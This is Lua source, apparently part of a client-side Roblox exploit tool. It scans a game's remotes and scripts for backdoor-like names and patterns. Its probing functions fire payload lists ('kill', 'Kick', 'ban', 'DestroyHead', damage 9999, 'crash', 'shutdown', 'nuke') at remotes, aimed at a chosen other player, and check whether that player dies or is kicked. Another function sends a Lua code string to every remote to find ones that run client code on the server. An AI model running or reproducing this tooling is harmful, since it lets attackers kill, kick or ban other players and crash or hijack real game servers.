local SourceRemoteAbuse = {
		{pat = "OnServerEvent%s*:Connect", sev = 2, cat = "RemoteHandler", title = "OnServerEvent handler"},
		{pat = "OnServerInvoke%s*=", sev = 2, cat = "RemoteHandler", title = "OnServerInvoke handler"},
		{pat = ":FireServer%s*%(", sev = 2, cat = "RemoteCall", title = "FireServer call"},
		{pat = ":InvokeServer%s*%(", sev = 2, cat = "RemoteCall", title = "InvokeServer call"},
	}

	local function getPath(obj)
		if not obj then
			return "?"
		end
		local ok, p = pcall(function()
			if Explorer and Explorer.GetInstancePath then
				return Explorer.GetInstancePath(obj)
			end
			return obj:GetFullName()
		end)
		if ok then
			return p
		end
		return tostring(obj)
	end

	local function safeDecompile(scr)
		if not env or not env.decompile then
			return nil, "no decompile"
		end
		if env.isViableDecompileScript and not env.isViableDecompileScript(scr) then
			return nil, "not client-viable"
		end
		local ok, src = pcall(env.decompile, scr)
		if ok and type(src) == "string" and #src > 0 then
			return src, nil
		end
		return nil, tostring(src)
	end

	local function scoreRemoteName(name)
		local best = 0
		local reason = nil
		for _, h in ipairs(RemoteNameCritical) do
			if string.find(name, h.pat) then
				if h.sev > best then
					best = h.sev
					reason = h.pat
				end
			end
		end
		for _, h in ipairs(RemoteNameEconomy) do
			if string.find(name, h.pat) then
				if h.sev > best then
					best = h.sev
					reason = h.pat
				end
			end
		end
		for _, h in ipairs(RemoteNameManip) do
			if string.find(name, h.pat) then
				if h.sev > best then
					best = h.sev
					reason = h.pat
				end
			end
		end
		return best, reason
	end

	local function collectScanRoots()
		local roots = {}
		local prefer = {
			"Workspace",
			"ReplicatedStorage",
			"ServerStorage",
			"ServerScriptService",
			"StarterGui",
			"StarterPack",
			"StarterPlayer",
			"Players",
			"Lighting",
			"ReplicatedFirst",
		}
		for _, name in ipairs(prefer) do
			local ok, svc = pcall(function()
				return game:GetService(name)
			end)
			if ok and svc and not isSkipped(svc) then
				table.insert(roots, svc)
			end
		end
		
		for _, child in ipairs(game:GetChildren()) do
			if not SkipServiceNames[child.Name] and child.Name ~= "CoreGui" and child.Name ~= "CorePackages" then
				local already = false
				for _, r in ipairs(roots) do
					if r == child then
						already = true
						break
					end
				end
				if not already then
					table.insert(roots, child)
				end
			end
		end
		return roots
	end

	local function iterDescendantsFiltered(root, out)
		out = out or {}
		local stack = {root}
		while #stack > 0 do
			local node = table.remove(stack)
			if node and not isSkipped(node) then
				table.insert(out, node)
				local ok, children = pcall(function()
					return node:GetChildren()
				end)
				if ok and children then
					for i = #children, 1, -1 do
						table.insert(stack, children[i])
					end
				end
			end
		end
		return out
	end

	local function scanRemotes()
		setStatus("Scanning remotes (game only)...", 0.1)
		log("Scanning remotes â€” skipping CoreGui / internals", Color3.fromRGB(180, 220, 255))
		local remoteClasses = {
			RemoteEvent = true,
			RemoteFunction = true,
			UnreliableRemoteEvent = true,
		}
		local count = 0
		local flagged = 0
		local roots = collectScanRoots()
		local n = 0
		for _, root in ipairs(roots) do
			local objs = iterDescendantsFiltered(root)
			for _, obj in ipairs(objs) do
				n = n + 1
				if remoteClasses[obj.ClassName] then
					count = count + 1
					local sev, reason = scoreRemoteName(obj.Name)
					if sev >= 3 then
						flagged = flagged + 1
						addFinding(sev, "Backdoor", obj.ClassName .. ": " .. obj.Name, getPath(obj),
							"High-signal remote name (" .. tostring(reason) .. "). Likely admin/backdoor/economy surface.",
							obj, {remote = obj, reason = reason})
					elseif sev == 2 then
						addFinding(2, "Remote", obj.ClassName .. ": " .. obj.Name, getPath(obj),
							"Remote name suggests server manipulation. Verify server validation.",
							obj, {remote = obj, reason = reason})
					end
					
					local parentName = obj.Parent and obj.Parent.Name or ""
					if sev < 2 and (string.find(parentName, "[Aa]dmin") or string.find(parentName, "[Bb]ackdoor")
						or string.find(parentName, "[Hh]ack") or string.find(parentName, "[Cc]md")) then
						flagged = flagged + 1
						addFinding(4, "Backdoor", obj.ClassName .. " under suspicious folder: " .. obj.Name, getPath(obj),
							"Parent folder name is high-risk (" .. parentName .. ").",
							obj, {remote = obj, reason = "parent:" .. parentName})
					end
				end
				if n % 250 == 0 then
					task.wait()
				end
			end
		end
		log(string.format("Remotes scanned: %d | high-signal flags: %d", count, flagged), Color3.fromRGB(180, 220, 255))
		return count
	end

	local function scanScripts(doDecompile)
		setStatus("Scanning game scripts...", 0.25)
		log("Scanning scripts â€” CoreGui/PlayerModule skipped", Color3.fromRGB(180, 220, 255))
		local scripts = {}
		local roots = collectScanRoots()
		for _, root in ipairs(roots) do
			local objs = iterDescendantsFiltered(root)
			for _, obj in ipairs(objs) do
				if obj:IsA("LuaSourceContainer") and not isSkipped(obj) then
					table.insert(scripts, obj)
				end
			end
		end
		log("Game scripts found: " .. #scripts, Color3.fromRGB(180, 220, 255))

		local decompiled = 0
		local maxDecompile = 120
		for i, scr in ipairs(scripts) do
			if not scanRunning then
				break
			end
			setStatus(string.format("Script %d/%d: %s", i, #scripts, scr.Name), 0.25 + 0.5 * (i / math.max(#scripts, 1)))

			local path = getPath(scr)
			local nameSev, nameReason = scoreRemoteName(scr.Name)
			if nameSev >= 4 then
				addFinding(nameSev, "Backdoor", "Suspicious script name: " .. scr.Name, path,
					"Script name matches backdoor/admin pattern: " .. tostring(nameReason), scr)
			end

			if doDecompile and decompiled < maxDecompile then
				local src = select(1, safeDecompile(scr))
				if src then
					decompiled = decompiled + 1
					
					for _, sp in ipairs(SourceCritical) do
						if string.find(src, sp.pat) then
							addFinding(sp.sev, sp.cat, sp.title, path,
								"Critical pattern in source: " .. sp.pat, scr, {pattern = sp.pat})
						end
					end
					
					local hasRemoteCall = false
					for _, sp in ipairs(SourceRemoteAbuse) do
						if string.find(src, sp.pat) then
							hasRemoteCall = true
							break
						end
					end
					if hasRemoteCall and nameSev >= 3 then
						addFinding(3, "RemoteAbuse", "Remote traffic in high-risk script: " .. scr.Name, path,
							"Script both has suspicious name and fires/handles remotes.", scr)
					end
					
					if string.find(src, "require%s*%(%s*tonumber") or string.find(src, "require%s*%(%s*.-%+%s*%d+") then
						addFinding(5, "Backdoor", "Obfuscated require(assetId) pattern", path,
							"Dynamic require of numeric asset â€” common backdoor loader.", scr)
					end
					pcall(function()
						scr:SetAttribute("_DexScanSnippet", string.sub(src, 1, 2000))
					end)
				end
			end
			if i % 4 == 0 then
				task.wait()
			end
		end
		log("Decompiled (capped): " .. decompiled, Color3.fromRGB(180, 220, 255))
		return #scripts
	end


	local function scanAssetsAndGear()
		setStatus("Scanning assets / gear / meshes...", 0.72)
		log("Asset / gear / mesh surface scan", Color3.fromRGB(180, 220, 255))
		local roots = collectScanRoots()
		local gearHits, meshHits, insertHits = 0, 0, 0
		local n = 0
		for _, root in ipairs(roots) do
			local objs = iterDescendantsFiltered(root)
			for _, obj in ipairs(objs) do
				n = n + 1
				local className = obj.ClassName
				if className == "Tool" or className == "HopperBin" then
					gearHits = gearHits + 1
					local sev = 2
					local nm = obj.Name
					if string.find(nm, "[Gg]ear") or string.find(nm, "[Aa]dmin") or string.find(nm, "[Kk]ill") or string.find(nm, "[Bb]an") then
						sev = 4
					end
					addFinding(sev, "Gear", "Tool: " .. nm, getPath(obj),
						"Tool instance present. Check if client can grant via remote.", obj)
				elseif className == "SpecialMesh" or className == "FileMesh" or className == "DataModelMesh" then
					meshHits = meshHits + 1
					local meshId = ""
					pcall(function()
						meshId = tostring(obj.MeshId or "")
					end)
					if meshId ~= "" and meshId ~= "rbxassetid://0" then
						addFinding(2, "Mesh", className .. " MeshId", getPath(obj),
							"MeshId=" .. meshId, obj)
					end
				elseif className == "MeshPart" then
					local mid = ""
					pcall(function()
						mid = tostring(obj.MeshId or "")
					end)
					if mid ~= "" and #mid > 10 then
						meshHits = meshHits + 1
						addFinding(1, "Mesh", "MeshPart: " .. obj.Name, getPath(obj), "MeshId=" .. mid, obj)
					end
				elseif className == "RemoteEvent" or className == "RemoteFunction" then
					local nm = obj.Name
					local sev, reason = scoreRemoteName(nm)
					if sev >= 3 and (string.find(string.lower(nm), "gear") or string.find(string.lower(nm), "mesh")
						or string.find(string.lower(nm), "asset") or string.find(string.lower(nm), "insert")
						or string.find(string.lower(nm), "load")) then
						insertHits = insertHits + 1
						addFinding(sev, "AssetLoad", "Asset/gear remote: " .. nm, getPath(obj),
							"Remote name suggests gear/mesh/asset load surface (" .. tostring(reason) .. ").", obj, {remote = obj})
					end
				end
				if n % 300 == 0 then
					task.wait()
				end
			end
		end
		
		local ok, ins = pcall(function()
			return game:GetService("InsertService")
		end)
		if ok and ins then
			addFinding(1, "Info", "InsertService available", "game.InsertService",
				"Server can LoadAsset. Client remotes that proxy this are high risk.", ins)
		end
		log(string.format("Gear tools=%d mesh refs=%d asset remotes=%d", gearHits, meshHits, insertHits), Color3.fromRGB(180, 220, 255))
	end

	local function scanCrashAndLagSurfaces()
		setStatus("Scanning crash / lag surfaces...", 0.78)
		log("Crash / lag / shutdown surface scan", Color3.fromRGB(180, 220, 255))
		local roots = collectScanRoots()
		local n = 0
		for _, root in ipairs(roots) do
			for _, obj in ipairs(iterDescendantsFiltered(root)) do
				n = n + 1
				if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("UnreliableRemoteEvent") then
					local nm = obj.Name
					local lower = string.lower(nm)
					if string.find(lower, "crash") or string.find(lower, "lag") or string.find(lower, "nuke")
						or string.find(lower, "shutdown") or string.find(lower, "freeze") or string.find(lower, "bomb")
						or string.find(lower, "wipe") then
						addFinding(5, "CrashRisk", "Danger remote: " .. nm, getPath(obj),
							"Name indicates server crash/lag/wipe capability.", obj, {remote = obj})
					end
				end
				if n % 300 == 0 then
					task.wait()
				end
			end
		end
	end

	local function scanServices()
		
		setStatus("Checking high-risk services...", 0.8)
		local watch = {"ServerScriptService", "ServerStorage"}
		for _, name in ipairs(watch) do
			local ok, svc = pcall(function()
				return game:GetService(name)
			end)
			if ok and svc then
				local childCount = #svc:GetChildren()
				if childCount > 0 then
					addFinding(1, "Info", name .. " has " .. childCount .. " children", "game." .. name,
						"Server-side container present. Client cannot read contents unless replicated.", svc)
				end
			end
		end
	end

	local function resolveTargetPlayer()
		local name = probeTargetName
		if probeUsernameBox and probeUsernameBox.Text and #probeUsernameBox.Text > 0 then
			name = probeUsernameBox.Text
			probeTargetName = name
		end
		name = tostring(name or ""):gsub("^%s+", ""):gsub("%s+$", "")
		if name == "" then
			return plr, "localplayer"
		end
		
		local players = service.Players:GetPlayers()
		for _, p in ipairs(players) do
			if p.Name == name or p.DisplayName == name then
				return p, "exact"
			end
		end
		local lower = string.lower(name)
		for _, p in ipairs(players) do
			if string.lower(p.Name) == lower or string.lower(p.DisplayName) == lower then
				return p, "fuzzy"
			end
		end
		return nil, "not_found"
	end

	local function snapshotCharacter(player)
		local snap = {
			alive = false,
			health = nil,
			maxHealth = nil,
			head = false,
			hrp = false,
			parented = false,
			char = nil,
		}
		if not player then
			return snap
		end
		local char = player.Character
		snap.char = char
		if not char then
			return snap
		end
		snap.parented = char.Parent ~= nil
		local hum = char:FindFirstChildOfClass("Humanoid")
		if hum then
			snap.alive = hum.Health > 0 and hum:GetState() ~= Enum.HumanoidStateType.Dead
			snap.health = hum.Health
			snap.maxHealth = hum.MaxHealth
		end
		snap.head = char:FindFirstChild("Head") ~= nil
		snap.hrp = char:FindFirstChild("HumanoidRootPart") ~= nil
		return snap
	end

	local function describeDamage(before, after)
		local notes = {}
		if before.char and not after.char then
			table.insert(notes, "character removed")
		end
		if before.parented and not after.parented then
			table.insert(notes, "character unparented")
		end
		if before.head and not after.head then
			table.insert(notes, "HEAD DESTROYED")
		end
		if before.hrp and not after.hrp then
			table.insert(notes, "HRP destroyed")
		end
		if before.alive and not after.alive then
			table.insert(notes, "player DIED / health zero")
		end
		if before.health and after.health and after.health < before.health - 0.5 then
			table.insert(notes, string.format("health %.0fâ†’%.0f", before.health, after.health))
		end
		return notes
	end

	local function fireRemote(remote, className, args)
		if className == "RemoteEvent" or className == "UnreliableRemoteEvent" then
			remote:FireServer(table.unpack(args))
			return true, "fired"
		elseif className == "RemoteFunction" then
			local s, r = pcall(function()
				return remote:InvokeServer(table.unpack(args))
			end)
			return s, s and r or tostring(r)
		end
		return false, "unsupported"
	end

	local function buildPayloads(targetPlr)
		local localPlr = plr
		local payloads = {}
		
		table.insert(payloads, {label = "()", args = {}})
		table.insert(payloads, {label = "(nil)", args = {nil}})
		table.insert(payloads, {label = "(true)", args = {true}})
		table.insert(payloads, {label = "(1)", args = {1}})
		table.insert(payloads, {label = "('kill')", args = {"kill"}})
		table.insert(payloads, {label = "('Kick')", args = {"Kick"}})
		table.insert(payloads, {label = "('Destroy')", args = {"Destroy"}})
		table.insert(payloads, {label = "('head')", args = {"head"}})
		
		if targetPlr then
			table.insert(payloads, {label = "(targetPlayer)", args = {targetPlr}})
			table.insert(payloads, {label = "(target.Name)", args = {targetPlr.Name}})
			table.insert(payloads, {label = "(target.UserId)", args = {targetPlr.UserId}})
			table.insert(payloads, {label = "('kill', target)", args = {"kill", targetPlr}})
			table.insert(payloads, {label = "('Kill', target.Name)", args = {"Kill", targetPlr.Name}})
			table.insert(payloads, {label = "('kick', target)", args = {"kick", targetPlr}})
			table.insert(payloads, {label = "('Kick', target.Name)", args = {"Kick", targetPlr.Name}})
			table.insert(payloads, {label = "('ban', target)", args = {"ban", targetPlr}})
			table.insert(payloads, {label = "('destroy', target)", args = {"destroy", targetPlr}})
			table.insert(payloads, {label = "('DestroyHead', target)", args = {"DestroyHead", targetPlr}})
			table.insert(payloads, {label = "('Head', target)", args = {"Head", targetPlr}})
			table.insert(payloads, {label = "(target, 'kill')", args = {targetPlr, "kill"}})
			table.insert(payloads, {label = "(target.Name, 'kick')", args = {targetPlr.Name, "kick"}})
			table.insert(payloads, {label = "('damage', target, 9999)", args = {"damage", targetPlr, 9999}})
			table.insert(payloads, {label = "(target, 9999)", args = {targetPlr, 9999}})
			
			table.insert(payloads, {label = "({cmd='kill',player=target})", args = {{cmd = "kill", player = targetPlr}}})
			table.insert(payloads, {label = "({cmd='kick',name=target.Name})", args = {{cmd = "kick", name = targetPlr.Name}}})
			table.insert(payloads, {label = "({action='kill',target=target.Name})", args = {{action = "kill", target = targetPlr.Name}}})
		end
		
		table.insert(payloads, {label = "(localPlayer)", args = {localPlr}})
		table.insert(payloads, {label = "('kill', localPlayer)", args = {"kill", localPlr}})
		table.insert(payloads, {label = "('Kick', localPlayer.Name)", args = {"Kick", localPlr.Name}})
		
		table.insert(payloads, {label = "('givegear', target)", args = {"givegear", targetPlr}})
		table.insert(payloads, {label = "('GiveGear', target.Name)", args = {"GiveGear", targetPlr and targetPlr.Name}})
		table.insert(payloads, {label = "('gear', target, 1)", args = {"gear", targetPlr, 1}})
		table.insert(payloads, {label = "('tool', target)", args = {"tool", targetPlr}})
		table.insert(payloads, {label = "('GiveTool', target.Name, 'Sword')", args = {"GiveTool", targetPlr and targetPlr.Name, "Sword"}})
		
		table.insert(payloads, {label = "('mesh', 'rbxassetid://0')", args = {"mesh", "rbxassetid://0"}})
		table.insert(payloads, {label = "('LoadAsset', 0)", args = {"LoadAsset", 0}})
		table.insert(payloads, {label = "('insert', 0)", args = {"insert", 0}})
		table.insert(payloads, {label = "('LoadMesh', target, 0)", args = {"LoadMesh", targetPlr, 0}})
		
		table.insert(payloads, {label = "('crash')", args = {"crash"}})
		table.insert(payloads, {label = "('lag', target)", args = {"lag", targetPlr}})
		table.insert(payloads, {label = "('shutdown')", args = {"shutdown"}})
		table.insert(payloads, {label = "('nuke')", args = {"nuke"}})
		table.insert(payloads, {label = "({cmd='givegear',player=target})", args = {{cmd = "givegear", player = targetPlr}}})
		table.insert(payloads, {label = "({cmd='loadasset',id=0})", args = {{cmd = "loadasset", id = 0}}})
		table.insert(payloads, {label = "({action='crash'})", args = {{action = "crash"}}})
		return payloads
	end

	local function runBackdoorProbe(remote)
		if not remote or not remote.Parent then
			log("Probe aborted: remote missing", Color3.fromRGB(255, 120, 120))
			return
		end
		local className = remote.ClassName
		if className ~= "RemoteEvent" and className ~= "RemoteFunction" and className ~= "UnreliableRemoteEvent" then
			log("Probe only works on remotes", Color3.fromRGB(255, 180, 100))
			return
		end

		local targetPlr, how = resolveTargetPlayer()
		if not targetPlr then
			log("Target username not in this server: " .. tostring(probeTargetName), Color3.fromRGB(255, 120, 120))
			if probeStatusLabel then
				probeStatusLabel.Text = "Target not found"
				probeStatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
			end
			return
		end
		log(string.format("PROBEDOOR â†’ %s | target=%s (%s)", getPath(remote), targetPlr.Name, how), Color3.fromRGB(255, 200, 80))
		if probeStatusLabel then
			probeStatusLabel.Text = "Probing " .. targetPlr.Name .. "..."
			probeStatusLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
		end

		local before = snapshotCharacter(targetPlr)
		local kicked = false
		local kickConn
		kickConn = targetPlr.AncestryChanged:Connect(function(_, parent)
			if parent == nil then
				kicked = true
			end
		end)

		local payloads = buildPayloads(targetPlr)
		local confirmed = {}
		for _, entry in ipairs(payloads) do
			if not remote.Parent then
				log("Remote disappeared mid-probe", Color3.fromRGB(255, 100, 100))
				break
			end
			
			if not targetPlr.Parent then
				kicked = true
				table.insert(confirmed, "PLAYER LEFT / KICKED during probe")
				break
			end
			local snapA = snapshotCharacter(targetPlr)
			local okFire, result = pcall(function()
				return fireRemote(remote, className, entry.args)
			end)
			task.wait(0.35)
			local snapB = snapshotCharacter(targetPlr)
			local notes = describeDamage(snapA, snapB)
			if kicked then
				table.insert(notes, "KICKED from game")
			end
			if #notes > 0 then
				local msg = string.format("HIT %s %s â†’ %s", className, entry.label, table.concat(notes, ", "))
				log(msg, Color3.fromRGB(255, 80, 80))
				table.insert(confirmed, msg)
				addFinding(5, "BackdoorConfirmed", "SERVER TRUSTS CLIENT: " .. remote.Name, getPath(remote),
					msg .. " | payload " .. entry.label, remote, {remote = remote, payload = entry.label})
				
				if table.concat(notes, " "):find("HEAD") or table.concat(notes, " "):find("DIED") or table.concat(notes, " "):find("KICK") then
					break
				end
			else
				log(string.format("no effect %s %s", entry.label, okFire and "" or tostring(result)), Color3.fromRGB(120, 120, 120))
			end
		end

		if kickConn then
			kickConn:Disconnect()
		end

		local after = snapshotCharacter(targetPlr)
		local finalNotes = describeDamage(before, after)
		if kicked then
			table.insert(finalNotes, "target no longer in Players")
		end
		if #confirmed > 0 then
			log("CONFIRMED BACKDOOR BEHAVIOR on " .. remote.Name, Color3.fromRGB(255, 60, 60))
			if probeStatusLabel then
				probeStatusLabel.Text = "BACKDOOR HIT â€” check log"
				probeStatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
			end
		else
			log("No character damage / kick detected for this remote", Color3.fromRGB(140, 200, 140))
			if probeStatusLabel then
				probeStatusLabel.Text = "No effect on target"
				probeStatusLabel.TextColor3 = Color3.fromRGB(140, 200, 140)
			end
		end
		if #finalNotes > 0 then
			log("Net effect: " .. table.concat(finalNotes, ", "), Color3.fromRGB(255, 150, 100))
		end
		renderResults()
	end


	local function isFilteredRemote(remote)
		if not remote then
			return true
		end
		local full = ""
		pcall(function()
			full = remote:GetFullName()
		end)
		if full:find("^RobloxReplicatedStorage") or full:find("RobloxReplicatedStorage") then
			return true
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
			return true 
		end
		local p = remote.Parent
		local pp = p and p.Parent
		if p and p.Name == "Signals" and pp and pp.Name == "HDAdminClient" then
			return true
		end
		if p and p.Name == "DefaultChatSystemChatEvents" then
			return true
		end
		if isSkipped(remote) then
			return true
		end
		return false
	end

	local function generateProbeCode(len)
		len = len or 16
		local alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		local t = table.create(len)
		for i = 1, len do
			local idx = math.random(1, #alphabet)
			t[i] = string.sub(alphabet, idx, idx)
		end
		return table.concat(t)
	end

	
	local function autoProbeBackdoors()
		setStatus("Auto backdoor probe...", 0.85)
		log("Auto-probing remotes (workspace marker method)", Color3.fromRGB(255, 200, 80))
		local remotes = {}
		local codeMap = {} 

		local function sendMarker(remote)
			if isFilteredRemote(remote) then
				return
			end
			local code = generateProbeCode(math.random(14, 22))
			while codeMap[code] do
				code = generateProbeCode(math.random(14, 22))
			end
			local payload = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
			codeMap[code] = remote
			table.insert(remotes, remote)
			pcall(function()
				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
					remote:FireServer(payload)
				elseif remote:IsA("RemoteFunction") then
					task.spawn(function()
						pcall(function()
							remote:InvokeServer(payload)
						end)
					end)
				end
			end)
		end

		
		local okProt, protected = pcall(function()
			local key = "lh" .. tostring(game.PlaceId / 6666 * 1337 * game.PlaceId)
			return game:GetService("ReplicatedStorage"):FindFirstChild(key)
		end)
		if okProt and protected and protected:IsA("RemoteFunction") then
			log("Protected-style remote name present: " .. protected.Name, Color3.fromRGB(255, 150, 80))
			local code = generateProbeCode(18)
			codeMap[code] = protected
			pcall(function()
				task.spawn(function()
					pcall(function()
						protected:InvokeServer("probe", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
					end)
				end)
			end)
			addFinding(4, "BackdoorSuspect", "Protected remote name pattern: " .. protected.Name, getPath(protected),
				"Matches common protected backdoor naming (lh+PlaceId formula).", protected, {remote = protected})
		end

		local roots = collectScanRoots()
		local n = 0
		for _, root in ipairs(roots) do
			local objs = iterDescendantsFiltered(root)
			for _, obj in ipairs(objs) do
				n = n + 1
				if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("UnreliableRemoteEvent")) and not isFilteredRemote(obj) then
					sendMarker(obj)
				end
				if n % 100 == 0 then
					task.wait()
				end
			end
		end
		log("Markers sent to " .. #remotes .. " remotes â€” waiting for workspace echo...", Color3.fromRGB(180, 220, 255))

		local found = {}
		for round = 1, 40 do
			if not scanRunning then
				break
			end
			for code, remote in pairs(codeMap) do
				if not found[code] then
					local marker = workspace:FindFirstChild(code)
					if marker then
						found[code] = true
						pcall(function()
							marker:Destroy()
						end)
						local path = getPath(remote)
						log("BACKDOOR CONFIRMED (marker): " .. path, Color3.fromRGB(255, 60, 60))
						addFinding(5, "BackdoorConfirmed", "REMOTE EXECUTES SERVER CODE: " .. remote.Name, path,
							"Workspace marker appeared after FireServer/InvokeServer of Instance.new payload. Server runs client strings.",
							remote, {remote = remote, method = "workspace_marker"})
						if probeStatusLabel then
							probeStatusLabel.Text = "BACKDOOR: " .. remote.Name
							probeStatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
						end
					end
				end
			end
			local countFound = 0
			for _ in pairs(found) do
				countFound = countFound + 1
			end
			setStatus(string.format("Auto probe %d/40 â€” confirmed %d", round, countFound), 0.85 + 0.1 * (round / 40))
			task.wait(0.12)
		end

		local countFound = 0
		for _ in pairs(found) do
			countFound = countFound + 1
		end
		if countFound == 0 then
			log("Auto probe: no workspace markers (no string-exec backdoor detected)", Color3.fromRGB(140, 200, 140))
		else
			log("Auto probe confirmed " .. countFound .. " backdoor remote(s)", Color3.fromRGB(255, 80, 80))
		end
		return countFound
	end

	local function runTest(finding)
		local remote = finding.remote or (finding.meta and finding.meta.remote) or finding.scriptRef
		if not remote or not remote.Parent then
			log("Test failed: remote gone", Color3.fromRGB(255, 120, 120))
			return
		end
		
		local className = remote.ClassName
		if className == "RemoteEvent" or className == "RemoteFunction" or className == "UnreliableRemoteEvent" then
			runBackdoorProbe(remote)
			return
		end
		log("TEST â†’ " .. className .. " " .. getPath(remote), Color3.fromRGB(255, 220, 120))
		if ScriptViewer and ScriptViewer.ViewScript and remote:IsA("LuaSourceContainer") then
			pcall(ScriptViewer.ViewScript, remote)
		elseif Explorer and Explorer.ViewObj then
			pcall(Explorer.ViewObj, remote)
		end
	end

